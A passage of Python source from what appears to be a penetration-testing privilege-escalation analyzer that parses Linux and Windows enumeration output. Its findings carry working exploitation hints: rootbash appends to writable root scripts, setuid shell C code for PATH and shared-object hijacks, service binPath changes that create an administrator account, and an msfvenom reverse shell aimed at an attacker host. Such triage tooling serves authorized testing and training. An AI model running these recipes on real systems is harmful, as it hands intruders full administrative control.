                       hint=f"printf '#!/bin/bash\\n{_ROOTBASH}\\n' >> {spath} (append; or replace it if the dir "
                            f"is writable); sudo {cmd_tail}; /tmp/rootbash -p")
            _ev(store, path, bl(m), "sudo_script_writable", "linux", user=sudo_user, target=spath, cmd=cmd_tail)
        else:
            report.add("HIGH", CAT, path, bl(m),
                       f"sudo-able script {spath} ({m.group(1).strip()}) - verify writability + inner commands",
                       hint=f"ls -la {spath} {os.path.dirname(spath)} -> writable => append `{_ROOTBASH}`; "
                            f"else read it for relative commands (PATH hijack only if secure_path is absent) "
                            f"and for files it sources/imports (python: sibling .py in the script dir)")
            _ev(store, path, bl(m), "sudo_script", "linux", user=sudo_user, target=spath, cmd=cmd_tail)


# ═══════════════════════════════════════════════════════════════════════════
# D3-03  non-standard SUID/SGID + strings/ldd relative-dependency hijack
# ═══════════════════════════════════════════════════════════════════════════
_PV_FIND_SUID = re.compile(
    r'(?im)^[^\r\n]{0,40}\bfind\s+/\S*[^\r\n]*?-perm\s+[-/]?(?:[0-7]?[46]000|u[=+]s|g[=+]s)[^\r\n]*$')
_PV_BARE_PATH = re.compile(r'^(/[\w./+\-]{3,200})$')
_PV_LS_SUID = re.compile(
    r'(?im)^-[rwx-]{2}([sS])[rwx-]{2}([sS]|[x-])[rwx-]{3}[+.@]?[ \t]+\d+[ \t]+(\S+)[ \t]+(\S+)[ \t]+\d+'
    r'[ \t]+\S+[ \t]+\S+[ \t]+\S+[ \t]+(/\S+)[ \t]*$')
_PV_LS_SGID = re.compile(
    r'(?im)^-[rwx-]{5}([sS])[rwx-]{3}[+.@]?[ \t]+\d+[ \t]+(\S+)[ \t]+(\S+)[ \t]+\d+'
    r'[ \t]+\S+[ \t]+\S+[ \t]+\S+[ \t]+(/\S+)[ \t]*$')
_PV_STRINGS_PROMPT = re.compile(r'(?im)^[^\r\n]{0,40}\bstrings\s+(-n\s*\d+\s+)?(/\S+)[ \t]*$')
_PV_LDD_PROMPT = re.compile(r'(?im)^[^\r\n]{0,40}\bldd\s+(/\S+)[ \t]*$')
_PV_REL_CMD = re.compile(
    r'(?m)^(?:service|systemctl|apachectl|apache2|nginx|httpd|mysql|mysqldump|cp|mv|rm|cat|ls|ps|id|'
    r'whoami|tar|gzip|zip|unzip|sh|bash|python[23]?|perl|ruby|curl|wget|nc|netcat|mail|sendmail|date|'
    r'uname|echo|chmod|chown|kill|pkill|ifconfig|ip|netstat|ss)(?:[ \t]+[^\r\n]{0,120})?$')
_PV_SH_C_REL = re.compile(r'(?m)^/bin/(?:ba)?sh[ \t]+-c[ \t]+[\'"]?([a-z][\w.\-]*)(?:[ \t][^\r\n]{0,120})?$')
_PV_REL_SO = re.compile(
    r'(?m)^(?!/)[\w.\-]+\.so(?:\.\d+)*$|^(/(?:home|tmp|opt|usr/local|var)/\S+\.so(?:\.\d+)*)$')
_PV_LDD_NOTFOUND = re.compile(r'(?m)^[ \t]*(\S+\.so(?:\.\d+)*)\s*=>\s*not found')
_SUID_BENIGN = {
    "passwd", "sudo", "sudoedit", "su", "mount", "umount", "chsh", "chfn", "gpasswd", "newgrp",
    "fusermount", "fusermount3", "ping", "ping6", "ssh-keysign", "dbus-daemon-launch-helper", "at",
    "pppd", "Xorg", "Xorg.wrap", "snap-confine", "polkit-agent-helper-1", "vmware-user-suid-wrapper",
    "ntfs-3g", "chage", "expiry", "mount.cifs", "mount.nfs", "umount.nfs", "unix_chkpwd",
    "pam_timestamp_check", "staprun", "wall", "write", "crontab", "ssh-agent", "locate", "mlocate",
    "pkexec", "bwrap", "dmcrypt-get-device", "lxc-user-nic", "newuidmap", "newgidmap",
    "kismet_capture", "mail-dotlock", "dotlockfile", "ssh-keysign", "utempter", "cgexec",
}
_SYS_BIN_DIRS = ("/usr/bin/", "/bin/", "/usr/sbin/", "/sbin/", "/usr/libexec/", "/usr/lib/")
_CUSTOM_DIRS = ("/home/", "/opt/", "/usr/local/", "/srv/", "/tmp/", "/var/", "/root/", "/mnt/")
_PATH_HIJACK_HINT = (
    "printf '#include <stdlib.h>\\n#include <unistd.h>\\nint main(){{setuid(0);setgid(0);"
    "system(\"/bin/bash -p\");return 0;}}' > /tmp/{cmd}.c; gcc /tmp/{cmd}.c -o /tmp/{cmd}; "
    "PATH=/tmp:$PATH {bin}")
_SO_HIJACK_HINT = (
    "mkdir -p {dir}; printf '#include <stdio.h>\\n#include <stdlib.h>\\nstatic void inject() "
    "__attribute__((constructor));\\nvoid inject(){{setuid(0);system(\"/bin/bash -p\");}}' > /tmp/x.c; "
    "gcc -shared -fPIC -o {so} /tmp/x.c; {bin}")


def _gtfo_names():
    try:
        from analyzers import keyword as _kw
        return set(getattr(_kw, "_GTFOBINS_SUID", {}).keys())
    except Exception:
        return set()


def _pass_suid(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_suid", set())
    suid = ctx.setdefault("suid_paths", set())
    gtfo = _gtfo_names()
    lines = text.split("\n")

    def emit(p, line, sgid_only=False, owner="root", from_ls=False):
        bn = os.path.basename(p)
        suid.add(p)
        if p in seen:
            return
        in_sys = p.startswith(_SYS_BIN_DIRS)
        if bn in _SUID_BENIGN and in_sys:
            return
        if bn in gtfo and in_sys:
            if from_ls:
                return                   # keyword.py "SUID GTFOBins" matches the -rws ls row
            # iter-311 fix: a bare `find / -perm -4000` path listing (the most
            # common OSCP enumeration shape) has no -rws row, so keyword.py
            # never sees it. Emit the GTFOBins escape here instead.
            seen.add(p)
            try:
                from analyzers import keyword as _kw
                esc = _kw._GTFOBINS_SUID.get(bn, "")
            except Exception:
                esc = ""
            esc = esc.replace(f"./{bn}", p) if esc else ""
            hint = (f"{esc}  |  ref: gtfobins.github.io/gtfobins/{bn}" if esc
                    else f"gtfobins.github.io/gtfobins/{bn} - SUID section -> root")
            report.add("HIGH", CAT, path, line,
                       f"SUID-root GTFOBins-able binary: {p}", hint=hint)
            _ev(store, path, line, "suid_gtfobins", "linux", target=p, owner=owner)
            return
        seen.add(p)
        custom = p.startswith(_CUSTOM_DIRS)
        if sgid_only:
            sev, what = ("MEDIUM" if custom else "INFO"), "SGID"
        else:
            sev, what = ("HIGH" if custom else "MEDIUM"), "SUID-root"
        report.add(sev, CAT, path, line,
                   f"{'custom ' if custom else 'non-standard '}{what} binary: {p}",
                   hint=f"strings -n 6 {p} | less (relative commands / .so names) ; ldd {p} ; "
                        f"ltrace -f {p} ; run it: {p} ; if it is a copied shell/interpreter -> {p} -p")
        _ev(store, path, line, "suid_custom", "linux", target=p, sgid=sgid_only, owner=owner)

    # (A) find -perm prompt + bare paths
    for m in _PV_FIND_SUID.finditer(text):
        start = _ln(m)                                     # 1-based line of the prompt
        miss = 0
        for i in range(start, min(start + 400, len(lines))):
            if _PV_PROMPT.match(lines[i]):
                break
            pm = _PV_BARE_PATH.match(lines[i].strip())
            if pm and not re.search(r'\.so(?:\.\d+)*$', pm.group(1)):
                miss = 0
                emit(pm.group(1), i + 1)
            else:
                miss += 1
                if miss >= 3:
                    break
    # (B) ls rows
    for m in _PV_LS_SUID.finditer(text):
        if m.group(3) == "root":
            emit(m.group(5), _ln(m), owner="root", from_ls=True)
    for m in _PV_LS_SGID.finditer(text):
        emit(m.group(4), _ln(m), sgid_only=True, owner=m.group(2), from_ls=True)

    # (C) strings follow-up: relative command / .so within 300 lines
    for m in _PV_STRINGS_PROMPT.finditer(text):
        bin_p = m.group(2)
        if bin_p not in suid and not any(bin_p.startswith(d) for d in _CUSTOM_DIRS):
            continue
        start = _ln(m)
        window = lines[start:start + 300]
        for i, ln in enumerate(window):
            s = ln.rstrip()
            if _PV_PROMPT.match(s):
                break
            cm = _PV_REL_CMD.match(s) or _PV_SH_C_REL.match(s)
            if cm:
                word = s.split()[0] if _PV_REL_CMD.match(s) else cm.group(1)
                if s.startswith("/bin/") and not _PV_SH_C_REL.match(s):
                    continue
                key = ("rel_cmd", bin_p, word)
                if key in seen:
                    continue
                seen.add(key)
                report.add("CRITICAL", CAT, path, start + i + 1,
                           f"SUID {bin_p} executes relative `{word}` -> PATH hijack",
                           hint=_PATH_HIJACK_HINT.format(cmd=word, bin=bin_p))
                _ev(store, path, start + i + 1, "suid_rel_cmd", "linux", target=bin_p, cmd=word)
                continue
            sm = _PV_REL_SO.match(s)
            if sm:
                so = sm.group(1) or s
                if so.startswith("lib") and not so.startswith("/"):
                    continue
                key = ("rel_so", bin_p, so)
                if key in seen:
                    continue
                seen.add(key)
                so_path = so if so.startswith("/") else f"<dir in ld path>/{so}"
                report.add("HIGH", CAT, path, start + i + 1,
                           f"SUID {bin_p} loads {so} from a non-system path -> shared-object hijack",
                           hint=_SO_HIJACK_HINT.format(dir=os.path.dirname(so_path) or "/tmp", so=so_path, bin=bin_p))
                _ev(store, path, start + i + 1, "suid_rel_so", "linux", target=bin_p, so=so)
    # (D) ldd ... => not found
    for m in _PV_LDD_PROMPT.finditer(text):
        bin_p = m.group(1)
        start = _ln(m)
        seg_lines = []
        for ln in lines[start:start + 60]:
            if _PV_PROMPT.match(ln):
                break
            seg_lines.append(ln)
        seg = "\n".join(seg_lines)
        for nf in _PV_LDD_NOTFOUND.finditer(seg):
            so = nf.group(1)
            key = ("ldd_nf", bin_p, so)
            if key in seen:
                continue
            seen.add(key)
            line = start + seg[:nf.start()].count("\n") + 1  # seg is <= 60 lines
            sev = "HIGH" if bin_p in suid else "MEDIUM"
            report.add(sev, CAT, path, line,
                       f"{'SUID ' if bin_p in suid else ''}{bin_p}: ldd reports {so} => not found "
                       f"-> drop it in a writable dir on its search path",
                       hint=f"strings {bin_p} | grep -E 'RPATH|RUNPATH|/.*{re.escape(os.path.basename(so))}' ; "
                            f"readelf -d {bin_p} | grep -i path ; then " +
                            _SO_HIJACK_HINT.format(dir="<rpath dir>", so=f"<rpath dir>/{so}", bin=bin_p))
            _ev(store, path, line, "suid_rel_so", "linux", target=bin_p, so=so)


# ═══════════════════════════════════════════════════════════════════════════
# D3-04  system crontab / cron.d / linpeas cron section
# ═══════════════════════════════════════════════════════════════════════════
_F = r'(?:\*(?:/\d+)?|\d+(?:[,\-]\d+)*(?:/\d+)?)'
_PV_CRON_HDR = re.compile(r'(?im)^#\s*m\s+h\s+dom\s+mon\s+dow\s+user\s+command\s*$')
_PV_CRON_SHELL = re.compile(r'(?m)^SHELL=/bin/\w+$')
_PV_CRON_PATH = re.compile(r'(?m)^PATH=([^\r\n]+)$')
_PV_CRONTAB_L = re.compile(r'(?im)^[^\r\n]{0,40}\bcrontab\s+-l\b')
_PV_CRON_LINPEAS = re.compile(r'Cron jobs')
_PV_CRON_ROW = re.compile(
    r'(?im)^[ \t]*((?:' + _F + r'[ \t]+){5}|@(?:reboot|hourly|daily|weekly|monthly|yearly|annually)[ \t]+)'
    r'(?:(root|[a-z_][\w\-]{0,31})[ \t]+)?([^\r\n#]{1,300}?)[ \t]*$')
_PV_CRON_NAMES = re.compile(r'(?i)(?:^|/)(?:crontab|anacrontab|cron\.d/[^/]+|cron\.(?:hourly|daily|weekly|monthly)/[^/]+)$')
_PV_HIJACK_DIR = re.compile(r'^/(?:home|tmp|var/tmp|dev/shm|opt|srv)(?:/|$)')
_CRON_SKIP_WORDS = {"cd", "test", "run-parts", "[", "command", "sleep", "true", "/usr/bin/test"}
_CRON_DEFAULT = re.compile(r'(?:run-parts|test -x /usr/sbin/anacron|/usr/sbin/anacron)')


def _pass_cron(text, path, report, store, ctx, _ln):
    base = os.path.basename(path)
    anchored = bool(_PV_CRON_HDR.search(text) or _PV_CRONTAB_L.search(text)
                    or _PV_CRON_LINPEAS.search(text) or _PV_CRON_NAMES.search(path.replace("\\", "/")))
    if not anchored:
        sm = _PV_CRON_SHELL.search(text)
        if sm:
            pm = _PV_CRON_PATH.search(text)
            if pm and abs(text[:pm.start()].count("\n") - text[:sm.start()].count("\n")) <= 5:
                anchored = True
    if not anchored:
        return
    seen = ctx.setdefault("_seen_cron", set())
    lines = text.split("\n")
    # root prompt detection for `crontab -l` shape (C)
    prompt_is_root = {}
    last_root = None
    for i, ln in enumerate(lines):
        s = ln.rstrip()
        if "#" in s and (re.match(r'^[^\r\n]{0,60}[#]\s*$', s) or re.match(r'^[^\r\n]{0,60}#\s+crontab\s+-l\b', s)):
            last_root = True
        elif re.match(r'^[^\r\n]{0,60}\$\s*(?:\S.*)?$', s) and "crontab" in s:
            last_root = False
        prompt_is_root[i] = last_root
    path_m = _PV_CRON_PATH.search(text)
    cron_path = path_m.group(1).split(":") if path_m else []
    hijack_dirs = [d for d in cron_path if _PV_HIJACK_DIR.match(d) or d in (".", "")]
    emitted = 0
    for m in _PV_CRON_ROW.finditer(text):
        line = _ln(m)
        user, cmd = m.group(2), m.group(3).strip()
        if not cmd and not user:
            continue
        if user and user != "root" and (not cmd or user.endswith((".sh", ".py")) or "/" in user):
            cmd = (user + " " + cmd).strip()
            user = "root" if prompt_is_root.get(line - 1) else "?"
        elif user is None:
            user = "root" if prompt_is_root.get(line - 1) else "?"
        if user != "root":
            continue
        if _CRON_DEFAULT.search(cmd):
            continue
        key = (user, cmd)
        if key in seen:
            continue
        seen.add(key)
        first = cmd.split()[0] if cmd.split() else ""
        # target path for Evidence
        target = ""
        for tok in cmd.split():
            tok = tok.strip("'\"")
            if tok.startswith("/") and (tok.endswith((".sh", ".py", ".pl", ".rb")) or tok.startswith(_CUSTOM_DIRS)):
                target = tok
                break
        ctx["root_cmds"].append(("cron", cmd, line))
        # (2) PATH hijack
        if hijack_dirs and first and "/" not in first and first not in _CRON_SKIP_WORDS:
            d = hijack_dirs[0] if hijack_dirs[0] not in (".", "") else "<cwd of cron = /root? use the first writable PATH dir>"
            report.add("CRITICAL", CAT, path, line,
                       f"cron PATH hijack: PATH={d} precedes system dirs and root runs relative `{first}`",
                       hint=f"printf '#!/bin/bash\\n{_ROOTBASH}\\n' > {d}/{first}; chmod +x {d}/{first}; "
                            f"sleep 60; /tmp/rootbash -p")
            _ev(store, path, line, "cron_path_hijack", "linux", user="root", target=f"{d}/{first}", cmd=cmd)
            continue
        # (4) writable script upgrade (ctx filled by D3-05 for the whole file)
        wr = target and (ctx["writable"].get(target) or ctx["writable"].get(os.path.dirname(target)))
        if wr:
            report.add("CRITICAL", CAT, path, line,
                       f"root cron runs WRITABLE {target} -> root",
                       hint=f"printf '#!/bin/bash\\n{_ROOTBASH}\\n' >> {target}  (append, do not truncate) "
                            f"-> wait for the next run -> /tmp/rootbash -p")
            _ev(store, path, line, "cron_script_writable", "linux", user="root", target=target, cmd=cmd)
            continue
        if emitted >= 15:
            continue
        emitted += 1
        report.add("MEDIUM", CAT, path, line, f"root cron job: {cmd[:160]}",
                   hint=(f"ls -la {target} {os.path.dirname(target)} -> writable => append `{_ROOTBASH}`; "
                         f"else read it for relative commands / wildcards / files it sources" if target
                         else "check every path in the command for write access (ls -la) and relative words"))
        _ev(store, path, line, "cron_script", "linux", user="root", target=target, cmd=cmd)


# ═══════════════════════════════════════════════════════════════════════════
# D3-06  weak Windows service permissions (accesschk / sdshow / icacls /
#        Get-Acl / sc qc)   - fills ctx['services'], ctx['writable'] (win)
# ═══════════════════════════════════════════════════════════════════════════
_PV_ACC_SVC_NAME = re.compile(r'^[A-Za-z][\w.\-$]{1,64}$')
_PV_ACC_RW = re.compile(r'^[ \t]*RW[ \t]+(.+?)[ \t]*$')
_PV_ACC_PROMPT = re.compile(
    r'(?i)accesschk(?:64)?(?:\.exe)?[ \t]+(?:/accepteula[ \t]+)?(?:-\w+[ \t]+)*"([^"\r\n]+)"[ \t]+\*?[ \t]*$')
_PV_ACC_RIGHT = re.compile(r'^[ \t]+(SERVICE_[A-Z_]+|READ_CONTROL|WRITE_DAC|WRITE_OWNER|DELETE)[ \t]*$')
_PV_HIGH_PRINCIPAL = re.compile(
    r'(?i)^(?:NT AUTHORITY\\(?:SYSTEM|LOCAL SERVICE|NETWORK SERVICE)|BUILTIN\\Administrators|'
    r'NT SERVICE\\TrustedInstaller|CREATOR OWNER|APPLICATION PACKAGE AUTHORITY\\.*|S-1-5-18|'
    r'.*\\Administrators?|.*\\Domain Admins|.*\\Enterprise Admins)$')
_PV_SDDL_ACE = re.compile(
    r'\(A;[^;]*;([A-Z]+);;;(AU|BU|WD|IU|AN|BG|S-1-5-11|S-1-5-32-545|S-1-1-0|S-1-5-21-[\d\-]+)\)')
_PV_SDSHOW_PROMPT = re.compile(r'(?im)\bsc(?:\.exe)?[ \t]+sdshow[ \t]+(\S+)')
_PV_SVC_NAME_LINE = re.compile(r'(?im)^[ \t]*SERVICE_NAME:[ \t]*(\S+)')
_PV_ICACLS = re.compile(
    r'(?im)^[ \t]*(?:([A-Za-z]:\\[^\r\n]*?)[ \t]+)?'
    r'((?:NT AUTHORITY\\[\w ]+|NT SERVICE\\[\w.\-$]+|BUILTIN\\[\w ]+|APPLICATION PACKAGE AUTHORITY\\[\w ]+|'
    r'CREATOR OWNER|Everyone|Authenticated Users|[\w.\-]+\\[\w.\-$ ]+?)):((?:\([A-Z,]+\))+)[ \t]*$')
_PV_GETACL_PATH = re.compile(
    r'(?im)^Path\s*:\s*(?:Microsoft\.PowerShell\.Core\\FileSystem::)?([A-Za-z]:\\[^\r\n]+?)[ \t]*$')
_PV_GETACL_ACE = re.compile(
    r'(?im)^(?:Access\s*:\s*)?(BUILTIN\\Users|Everyone|NT AUTHORITY\\Authenticated Users|'
    r'NT AUTHORITY\\INTERACTIVE|[\w.\-]+\\[\w.\-$]+)\s+Allow\s+(FullControl|Modify|Write\w*)')
_PV_SC_QC = re.compile(
    r'(?is)SERVICE_NAME:[ \t]*(\S+).{0,600}?BINARY_PATH_NAME[ \t]*:[ \t]*"?([^\r\n"]+?)"?(?:[ \t]+-[^\r\n]*)?\r?\n'
    r'.{0,400}?SERVICE_START_NAME[ \t]*:[ \t]*([^\r\n]+)')
_PV_SC_QC_BLEED = re.compile(r'SERVICE_NAME:')
_WIN_EXEC_EXT = (".exe", ".dll", ".bat", ".cmd", ".ps1", ".msi")
_ICACLS_WRITE = {"F", "M", "W", "WD", "WDAC", "WO", "GA", "GW", "AD", "DC"}
_WIN_NEVER = re.compile(r'(?i)^[A-Za-z]:\\Windows\\(?:System32|SysWOW64|WinSxS|assembly)(?:\\|$)')


def _svc_hint(svc, ctx):
    auto = ctx.get("svc_auto", {}).get(svc)
    restart = f"sc stop {svc} ; sc start {svc}"
    if ctx.get("shutdown_priv") or auto:
        restart += "  (no stop/start right? START_TYPE AUTO + SeShutdownPrivilege: shutdown /r /t 0)"
    return (f"sc config {svc} binPath= \"C:\\Users\\<u>\\rev.exe\" ; {restart} ; rev.exe = {_REV_SVC_EXE}  |  "
            f"or binPath= \"cmd /c net user pwn Passw0rd! /add && net localgroup Administrators pwn /add\" "
            f"-> impacket-psexec 'pwn:Passw0rd!@<target>'")


def _bin_hint(bin_p, svc, ctx):
    restart = f"sc stop {svc} ; sc start {svc}" if svc else "restart the service / reboot (shutdown /r /t 0 needs SeShutdownPrivilege)"
    return (f"copy /Y rev.exe \"{bin_p}\" (after sc stop {svc or '<svc>'}) ; {restart} ; rev.exe = {_REV_SVC_EXE}  |  "
            f"or a C#/`cmd /c` wrapper running net user pwn Passw0rd! /add && net localgroup Administrators pwn /add")


def _is_win_writable(p, ctx):
    p_l = p.lower().rstrip("\\")
    for w in ctx["writable"]:
        w_l = w.lower().rstrip("\\")
        if p_l == w_l or p_l.startswith(w_l + "\\"):
            return True
    return False


def _pass_win_services(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_winsvc", set())
    lines = text.split("\n")
    services = ctx["services"]

    # (E) sc qc blocks FIRST - ctx['services'] feeds (C)/(D) upgrades
    for m in _PV_SC_QC.finditer(text):
        span = text[m.end(1):m.start(3)]
        if _PV_SC_QC_BLEED.search(span):
            continue
        svc, binp, runas = m.group(1).strip(), m.group(2).strip(), m.group(3).strip()
        bexe = binp
        low = binp.lower()
        if ".exe" in low:
            bexe = binp[:low.index(".exe") + 4]
        services[svc] = bexe
        auto = "AUTO_START" in text[m.start():m.end()].upper()
        ctx.setdefault("svc_auto", {})[svc] = auto
        _ev(store, path, _ln(m), "win_service", "windows", target=bexe, svc=svc, runas=runas, auto=auto)

    # (A) accesschk line-walk
    cur_svc = None
    acc_principal = "the queried principal"
    i = 0
    while i < len(lines):
        s = lines[i].rstrip("\r")
        apm = _PV_ACC_PROMPT.search(s)
        if apm:
            acc_principal = apm.group(1).strip()
            i += 1
            continue
        if _PV_ACC_SVC_NAME.match(s):
            cur_svc = s.strip()
            i += 1
            continue
        rw = _PV_ACC_RW.match(s)
        if rw:
            tok = rw.group(1).strip()
            principal_like = ("\\" in tok or tok in ("Everyone", "Authenticated Users", "INTERACTIVE", "Users"))
            principal = tok if principal_like else acc_principal
            svc = cur_svc if principal_like else tok
            rights, j = [], i + 1
            while j < len(lines):
                rm = _PV_ACC_RIGHT.match(lines[j].rstrip("\r"))
                if not rm:
                    break
                rights.append(rm.group(1))
                j += 1
            if rights and svc and not _PV_HIGH_PRINCIPAL.match(principal):
                hit = sorted({r for r in rights if r in ("SERVICE_ALL_ACCESS", "SERVICE_CHANGE_CONFIG", "WRITE_DAC", "WRITE_OWNER")})
                key = ("acc", svc, principal)
                if hit and key not in seen:
                    seen.add(key)
                    report.add("CRITICAL", CAT, path, i + 1,
                               f"service {svc} DACL: {principal} has {','.join(hit)} -> binPath hijack",
                               hint=_svc_hint(svc, ctx))
                    _ev(store, path, i + 1, "svc_change_config", "windows", target=svc, svc=svc,
                        principal=principal, rights=hit)
                elif {"SERVICE_START", "SERVICE_STOP"} <= set(rights) and ("ss", svc) not in seen:
                    seen.add(("ss", svc))
                    ctx.setdefault("start_stop", set()).add(svc)
                    _ev(store, path, i + 1, "svc_start_stop", "windows", target=svc, svc=svc, principal=principal)
            i = j if rights else i + 1
            continue
        i += 1

    # (B) sc sdshow SDDL
    for i, s in enumerate(lines):
        if not (s.lstrip().startswith("D:") or s.count("(A;") >= 2):
            continue
        svc = None
        for j in range(i, max(-1, i - 12), -1):
            pm = _PV_SDSHOW_PROMPT.search(lines[j]) or _PV_SVC_NAME_LINE.match(lines[j])
            if pm:
                svc = pm.group(1)
                break
        svc = svc or "<svc>"
        for am in _PV_SDDL_ACE.finditer(s):
            toks = {am.group(1)[k:k + 2] for k in range(0, len(am.group(1)), 2)}
            hit = sorted({"DC", "WD", "WO", "GA", "GW"} & toks)
            key = ("sddl", svc, am.group(2))
            if hit and key not in seen:
                seen.add(key)
                report.add("CRITICAL", CAT, path, i + 1,
                           f"sc sdshow {svc}: trustee {am.group(2)} has {','.join(hit)} (change config / DACL) ",
                           hint=_svc_hint(svc, ctx))
                _ev(store, path, i + 1, "svc_change_config", "windows", target=svc, svc=svc,
                    principal=am.group(2), rights=hit)

    # (C) icacls rows (+ continuation lines)
    last_path = None
    for i, s in enumerate(lines):
        m = _PV_ICACLS.match(s.rstrip("\r"))
        if not m:
            if re.match(r'^[A-Za-z]:\\\S', s) and ":" not in s[2:]:
                last_path = s.strip()
            continue
        if m.group(1):
            last_path = m.group(1).strip()
        p = last_path
        if not p:
            continue
        principal = m.group(2).strip()
        perms = re.findall(r'\(([A-Z,]+)\)', m.group(3))
        toks = {t for grp in perms for t in grp.split(",")}
        if not (toks & _ICACLS_WRITE):
            continue
        if _PV_HIGH_PRINCIPAL.match(principal) or principal.lower().endswith(("\\administrator", "\\administrators", "\\system")):
            continue
        if _WIN_NEVER.match(p):
            continue
        ctx["writable"][p] = "icacls:" + principal
        _emit_win_writable(p, principal, ",".join(sorted(toks & _ICACLS_WRITE)), i + 1, path, report, store, ctx, seen, "icacls")

    # (D) Get-Acl blocks
    cur = None
    for i, s in enumerate(lines):
        pm = _PV_GETACL_PATH.match(s)
        if pm:
            cur = pm.group(1).strip()
            continue
        am = _PV_GETACL_ACE.match(s)
        if am and cur:
            principal, right = am.group(1), am.group(2)
            if _PV_HIGH_PRINCIPAL.match(principal) or _WIN_NEVER.match(cur):
                continue
            ctx["writable"][cur] = "getacl:" + principal
            _emit_win_writable(cur, principal, right, i + 1, path, report, store, ctx, seen, "Get-Acl")


def _emit_win_writable(p, principal, right, line, path, report, store, ctx, seen, src):
    key = ("w", p.lower(), principal.lower())
    if key in seen:
        return
    low = p.lower()
    is_exec = low.endswith(_WIN_EXEC_EXT)
    is_dir = not os.path.splitext(low)[1]
    if not (is_exec or is_dir):
        return
    seen.add(key)
    svc = None
    for s, b in ctx["services"].items():
        bl = b.lower()
        if bl == low or bl.startswith(low.rstrip("\\") + "\\"):
            svc = s
            break
    sev, why = "HIGH", ""
    if svc:
        sev, why = "CRITICAL", f" - service {svc} binary/dir"
    elif any(low.rstrip("\\") == d.lower().rstrip("\\") for d in ctx.get("unquoted_dirs", set())):
        sev, why = "CRITICAL", " - unquoted-service-path hijack dir"
    elif any(low.rstrip("\\") == d.lower().rstrip("\\") for d in ctx.get("win_paths", set())):
        sev, why = "HIGH", " - %PATH% directory (DLL / binary hijack)"
    elif any(low == t.lower() for t in ctx.get("task_targets", set())):
        sev, why = "CRITICAL", " - scheduled-task / autorun target"
    report.add(sev, CAT, path, line, f"{src}: {p} writable by {principal} ({right}){why}",
               hint=(_bin_hint(p, svc, ctx) if is_exec else
                     f"drop rev.exe / a DLL named like one a SYSTEM process loads into \"{p}\" ; "
                     f"{'sc stop ' + svc + ' ; sc start ' + svc if svc else 'restart the owning service'} ; "
                     f"rev.exe = {_REV_SVC_EXE}"))
    _ev(store, path, line, "win_writable_" + ("bin" if is_exec else "dir"), "windows",
        target=p, principal=principal, rights=right, svc=svc or "")


# ═══════════════════════════════════════════════════════════════════════════
# D3-07  unquoted service paths (wmic / Get-CimInstance / winPEAS)
# ═══════════════════════════════════════════════════════════════════════════
_PV_SVC_TABLE_HDR = re.compile(
    r'(?im)^[ \t]*Name[ \t]{2,}(?:DisplayName[ \t]{2,})?(?:State[ \t]{2,})?PathName(?:[ \t]{2,}StartMode)?[ \t]*$')
_PV_WINPEAS_UNQ = re.compile(r'No quotes and Space detected')
_PV_UNQ_PATH = re.compile(
    r'(?<![\"\w])([A-Za-z]:\\(?:[^\"\r\n]*?[ \t][^\"\r\n]*?)\.exe)(?=[ \t]|$)', re.I | re.M)
_PV_WINPEAS_SVC_ROW = re.compile(r'(?im)^[ \t]*([\w.\-$]+)\(([^)\r\n]*)\)\[([^\]\r\n]+)\][ \t]*-[ \t]*(\w+)')


def _pass_unquoted(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_unq", set())
    lines = text.split("\n")
    gated = set()
    for m in _PV_SVC_TABLE_HDR.finditer(text):
        start = _ln(m) - 1
        for i in range(start + 1, min(start + 400, len(lines))):
            if not lines[i].strip():
                break
            gated.add(i)
    for m in _PV_WINPEAS_UNQ.finditer(text):
        ln = _ln(m) - 1
        for i in range(max(0, ln - 2), min(ln + 3, len(lines))):
            gated.add(i)
    for i in sorted(gated):
        s = lines[i].rstrip("\r")
        if s.startswith("----"):
            continue
        for pm in _PV_UNQ_PATH.finditer(s):
            p = pm.group(1)
            if p.lower().startswith(("c:\\windows\\",)) or p.lower() in seen:
                continue
            seen.add(p.lower())
            wm = _PV_WINPEAS_SVC_ROW.match(s)
            if wm:
                svc, start_mode = wm.group(1), wm.group(4)
            else:
                svc = re.split(r'[ \t]{2,}', s.strip())[0] if re.search(r'[ \t]{2,}', s.strip()) else "<svc>"
                last = s.strip().split()[-1] if s.strip() else ""
                start_mode = last if last in ("Auto", "Manual", "Disabled") else ""
            if svc == "<svc>":
                for sname, b in ctx["services"].items():
                    if b.lower() == p.lower():
                        svc = sname
            cands = []
            for k, ch in enumerate(p):
                if ch == " ":
                    cands.append(p[:k] + ".exe")
            dirs = sorted({os.path.dirname(c.replace("\\", "/")).replace("/", "\\") for c in cands})
            ctx.setdefault("unquoted_dirs", set()).update(dirs)
            writable = [d for d in dirs if _is_win_writable(d, ctx)]
            sev = "CRITICAL" if writable else "HIGH"
            cand_txt = ", ".join(cands[:4])
            auto_txt = (" (StartMode=Auto: reboot restarts it)" if start_mode == "Auto" else "")
            report.add(sev, CAT, path, i + 1,
                       f"unquoted service path [{svc}]: {p} -> hijack candidates {cand_txt}"
                       + (f" - WRITABLE dir: {', '.join(writable)}" if writable else "") + auto_txt,
                       hint=(" ; ".join(f'icacls "{d}"' for d in dirs[:4]) +
                             " (look for BUILTIN\\Users:(W)/(M)/(F) or Everyone) ; "
                             f"msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATT> LPORT=443 -f exe-service "
                             f"-o {_wbase(cands[0]) if cands else 'x.exe'} (quota-free) ; copy it into the dir ; "
                             f"sc stop {svc} ; sc start {svc}"
                             + ("  |  no stop right + Auto: shutdown /r /t 0 (needs SeShutdownPrivilege)"
                                if start_mode == "Auto" else "")))
            _ev(store, path, i + 1, "unquoted_path", "windows", target=p, svc=svc, candidates=cands,
                start=start_mode, writable_dirs=writable)


# ═══════════════════════════════════════════════════════════════════════════
# D3-09  DLL hijacking (winPEAS PATH rows / Procmon NAME NOT FOUND / Path=)
# ═══════════════════════════════════════════════════════════════════════════
_PV_WINPEAS_DLL = re.compile(
    r'(?im)^[ \t]*\(DLL Hijacking\)[ \t]+([A-Za-z]:\\[^:\r\n]+):[ \t]*([^\r\n\[]+?)[ \t]*\[([^\]\r\n]+)\]')
_PV_PROCMON_CSV = re.compile(
    r'(?im)^"[^"\r\n]*","([^"\r\n]+\.exe)","(\d+)","CreateFile","([A-Za-z]:\\[^"\r\n]+\.dll)","NAME NOT FOUND"')
_PV_PROCMON_TSV = re.compile(
    r'(?im)^[^\t\r\n]*\t([^\t\r\n]+\.exe)\t(\d+)\tCreateFile\t([A-Za-z]:\\[^\t\r\n]+\.dll)\tNAME NOT FOUND')
